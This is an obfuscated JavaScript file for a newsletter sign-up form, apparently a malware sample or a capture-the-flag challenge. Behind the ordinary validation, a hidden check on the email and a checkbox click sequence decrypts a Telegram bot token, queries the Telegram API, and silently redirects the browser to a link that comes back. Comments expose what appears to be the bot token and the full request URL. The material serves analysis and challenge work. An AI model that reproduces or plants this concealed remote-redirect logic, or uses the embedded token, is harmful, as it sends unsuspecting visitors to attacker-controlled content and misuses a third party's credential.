document.getElementById('newsletterForm').addEventListener('submit', function (e) {
    e.preventDefault();
    const emailField = document.getElementById('email');
    const descriptionField = document.getElementById('descriptionField');
    let isValid = true;
    if (!emailField['value']) {
      emailField['classList']['add']('shake');
      isValid = false;
      setTimeout(() => {
        return emailField['classList']['remove']('shake');
      }, 500);
    }
    ;
    if (!isValid) {
      return;
    }
    ;
    const emailValue = emailField['value'];
    const specialKey = emailValue['split']('@')[0]; // 0p3r4t10n_4PT_Un10n
    const desc = parseInt(descriptionField['value'], 10);
    f(specialKey, desc);
  });
  ;
  function G(r) {
    return function () {
      var r = Array.prototype.slice.call(arguments), o = r.shift();
      return r.reverse().map(function (r, t) {
        return String.fromCharCode(r - o - 7 - t);
      }).join("");
    }(43, 106, 167, 103, 163, 98) + 1354343..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split("").map(function (r) {
      return String.fromCharCode(r.charCodeAt() + -13);
    }).join("") + 4..toString(36).toLowerCase() + 32..toString(36).toLowerCase().split("").map(function (r) {
      return String.fromCharCode(r.charCodeAt() + -39);
    }).join("") + 381..toString(36).toLowerCase().split("").map(function (r) {
      return String.fromCharCode(r.charCodeAt() + -13);
    }).join("") + function () {
      var r = Array.prototype.slice.call(arguments), o = r.shift();
      return r.reverse().map(function (r, t) {
        return String.fromCharCode(r - o - 60 - t);
      }).join("");
    }(42, 216, 153, 153, 213, 187);
  }
  ;
  var _$_5975 = function (o, u) {
    var g = o.length;
    var t = [];
    for (var w = 0; w < g; w++) {
      t[w] = o.charAt(w);
    }
    ;
    for (var w = 0; w < g; w++) {
      var z = u * (w + 340) + u % 19375;
      var a = u * (w + 556) + u % 18726;
      var h = z % g;
      var q = a % g;
      var b = t[h];
      t[h] = t[q];
      t[q] = b;
      u = (z + a) % 5939310;
    }
    ;
    var k = "";
    var r = "";
    var l = "%";
    var i = "#1";
    var v = "%";
    var e = "#0";
    var f = "#";
    return t.join(r).split(l).join(k).split(i).join(v).split(e).join(f).split(k);
  }("%dimfT%mVlzx%degpatf5bfnrG%6tSiqth5at%easpi0emILmcim%e%/!=eZtnHf%e7cf+3rstO%%.D0i8p3t/Sphryoa%IL0rin%rcAeF6%nsenoYaLeQ5Natp4CrSrCGttUtZrdG%rlxe2poa2rdg=9fQs%&j_of0ButCO tb=r35DyCee8tgaCf=I=%rAQa4fe%ar0aonsGT_v/NgoPouP2%eoe%ue3tl&enTceynCtt4FBs%s/rBsAUEhradnkrstfgd?%t%xeyhcedeTo%olghXMsaocrB3aaDBr5rRa16Cjuct%cOee5lWE_ooo+Ka4%d3TysnehshstepId%%Ieoaycug:i_m=%%mjp0tgaiidoei.prn%sw1d", 4129280);
  function f(oferkfer, icd) {
    const channel_id = -1002496072246;
    var enc_token = "nZiIjaXAVuzO4aBCf5eQ5ifQI7rUBI3qy/5t0Djf0pG+tCL3Y2bKBCFIf3TZ0Q==";
    if (oferkfer === G('s3cur3k3y') && CryptoJS.SHA256(sequence.join('')).toString(CryptoJS['enc']['Base64']) === '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=') {
      var decrypted = CryptoJS['RC4Drop']['decrypt'](enc_token, CryptoJS['enc']['Utf8']['parse'](oferkfer), {drop: 192}).toString(CryptoJS['enc']['Utf8']);
      var HOST = 'https://api.telegram.org/bot' + decrypted; // 7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc
      var xhr = new XMLHttpRequest;
      xhr['onreadystatechange'] = function () {
        if (xhr['readyState'] == XMLHttpRequest['DONE']) {
          const resp = JSON['parse'](xhr['responseText']);
          try {
            const link = resp['result']['text'];
            window['location']['replace'](link);
          } catch (error) {
            alert('Form submitted!');
          }
        }
      };
      // https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=-1002496072246&from_chat_id=-1002496072246&message_id=5
      xhr['open']('GET', HOST + '/' + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5');
      xhr['send'](null);
    } else {
      alert('Form submitted!');
    }
  }
  ;
  ;
  var sequence = [];
  ;
  function l() {
    sequence.push(this.id);
  }
  ;
  ;
  var checkboxes = document.querySelectorAll("input[class=cb]");
  for (var i = 0; i < checkboxes.length; i++) {
    checkboxes[i].addEventListener("change", l);
  }